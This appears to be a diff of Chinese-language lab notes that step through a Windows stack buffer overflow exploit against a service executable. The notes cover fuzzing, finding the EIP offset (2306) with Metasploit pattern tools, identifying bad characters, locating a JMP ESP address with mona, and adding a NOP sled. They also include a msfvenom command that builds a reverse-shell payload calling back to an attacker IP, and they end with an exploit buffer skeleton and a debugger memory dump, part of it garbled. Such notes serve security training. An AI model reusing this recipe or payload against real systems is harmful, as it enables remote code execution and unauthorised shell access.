@@ -1,3 +1,83 @@
-1.fuzz找到多少byte可以crash服務
-2.生成足夠長字段來crash
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
+1.fuzz找到多少byte可以crash服務,python 每次增加一百個A
+(將error service reporting功能取消)
+https://www.lifewire.com/how-do-i-disable-error-reporting-in-windows-2626074#:~:text=Another%20way%20to%20disable%20error,value%20with%20that%20exact%20name.&text=You%20can%20make%20a%20new,New%20menu%20in%20Registry%20Editor.
+2.發現2400可以Crash服務
+3.生成2400pattern字段來crash,找出EIP位置
+msf-pattern_create -l 2400
+4.發現2400長度會造成Crash,2300程序正常執行但會執行到死掉,這時找到的是EIP 39794338
+5.找到offset,是2306
+msf-pattern_offset -l 2400 -q 39794338
+6.設置filler+eip+buffer可以驗證我們可以控制EIP
+7.輸入badchars一個一個找出badchars####使用python2.7 使用python3會有問題
+8.將buffer換成badchars,在ESP選擇fellow in dump查找badchars
+找到\x51
+9.查找可用的程序緩存地址 msf-nasm_shell jmp esp
+00000000  FFE4              jmp esp
+8.找到JMP ESP地址  0x1120110d   \x0d\x11\x20\x11
+!mona find -s "\xff\xe4" -m "Stroageserver.exe"
+9.上面選擇搜索 0x1120110d,F2追蹤,F9執行
+10.最後因為decoder的原因,需要shellcode前面加十個\x90
+
+
+9.生成shell code
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x51"
+
+
+
+filler = "A"* 2306
+eip = "B" * 4
+buffer = "C" * 16
+inputbuffer = filler + eip + buffer
+
+01AFEE5C  43 43 43 43 01 02 03 04  CCCC
+01AFEE64  05 06 07 08 09 0A 0B 0C  ...
+01AFEE6C  0D 0E 0F 10 11 12 13 14  .
+01AFEE74  15 16 17 18 19 1A 1B 1C  
+01AFEE7C  1D 1E 1F 20 21 22 23 24   !"#$
+01AFEE84  25 26 27 28 29 2A 2B 2C  %&'()*+,
+01AFEE8C  2D 2E 2F 30 31 32 33 34  -./01234
+01AFEE94  35 36 37 38 39 3A 3B 3C  56789:;<
+01AFEE9C  3D 3E 3F 40 41 42 43 44  =>?@ABCD
+01AFEEA4  45 46 47 48 49 4A 4B 4C  EFGHIJKL
+01AFEEAC  4D 4E 4F 50 52 53 54 55  MNOPRSTU
+01AFEEB4  56 57 58 59 5A 5B 5C 5D  VWXYZ[\]
+01AFEEBC  5E 5F 60 61 62 63 64 65  ^_`abcde
+01AFEEC4  66 67 68 69 6A 6B 6C 6D  fghijklm
+01AFEECC  6E 6F 70 71 72 73 74 75  nopqrstu
+01AFEED4  76 77 78 79 7A 7B 7C 7D  vwxyz{|}
+01AFEEDC  7E 7F 80  81  82  ~Â€ÂÂ‚
+01AFEEE4   83 84  85  86  ÂƒÂ„Â…Â†
+01AFEEEC   87 88  89  8A  Â‡ÂˆÂ‰ÂŠ
+01AFEEF4   8B 8C  8D  8E  Â‹ÂŒÂÂŽ
+01AFEEFC   8F 90  91  92  ÂÂÂ‘Â’
+01AFEF04   93 94  95  96  Â“Â”Â•Â–
+01AFEF0C   97 98  99  9A  Â—Â˜Â™Âš
+01AFEF14   9B 9C  9D  9E  Â›ÂœÂÂž
+01AFEF1C   9F A0  A1  A2  ÂŸÂ Â¡Â¢
+01AFEF24   A3 A4  A5  A6  Â£Â¤Â¥Â¦
+01AFEF2C   A7 A8  A9  AA  Â§Â¨Â©Âª
+01AFEF34   AB AC  AD  AE  Â«Â¬Â­Â®
+01AFEF34   AB  AC  AD  AE  Â«Â¬Â­Â®
+01AFEF3C   AF  B0  B1  B2  Â¯Â°Â±Â²
+01AFEF44   B3  B4  B5  B6  Â³Â´ÂµÂ¶
+01AFEF4C   B7  B8  B9  BA  Â·Â¸Â¹Âº
+01AFEF54   BB  BC  BD  BE  Â»Â¼Â½Â¾
+01AFEF5C   BF  80  81  82  Â¿Ã€ÃÃ‚
+01AFEF64   83  84  85  86  ÃƒÃ„Ã…Ã†
+01AFEF6C   87  88  89  8A  Ã‡ÃˆÃ‰ÃŠ
+01AFEF74   8B  8C  8D  8E  Ã‹ÃŒÃÃŽ
+01AFEF7C   8F  90  91  92  ÃÃÃ‘Ã’
+01AFEF84   93  94  95  96  Ã“Ã”Ã•Ã–
+01AFEF8C   97  98  99  9A  Ã—Ã˜Ã™Ãš
+01AFEF94   9B  9C  9D  9E  Ã›ÃœÃÃž
+01AFEF9C   9F  A0  A1  A2  ÃŸÃ Ã¡Ã¢
+01AFEFA4   A3  A4  A5  A6  Ã£Ã¤Ã¥Ã¦
+01AFEFAC   A7  A8  A9  AA  Ã§Ã¨Ã©Ãª
+01AFEFB4   AB  AC  AD  AE  Ã«Ã¬Ã­Ã®
+01AFEFBC   AF  B0  B1  B2  Ã¯Ã°Ã±Ã²
+01AFEFC4   B3  B4  B5  B6  Ã³Ã´ÃµÃ¶
+01AFEFCC   B7  B8  B9  BA  Ã·Ã¸Ã¹Ãº
+01AFEFD4   BB  BC  BD  BE  Ã»Ã¼Ã½Ã¾
+01AFEFDC   BF  41  41  41  Ã¿.AAAAA
+01AFEFE4   41  41  41  41  AAAAAAAA
+
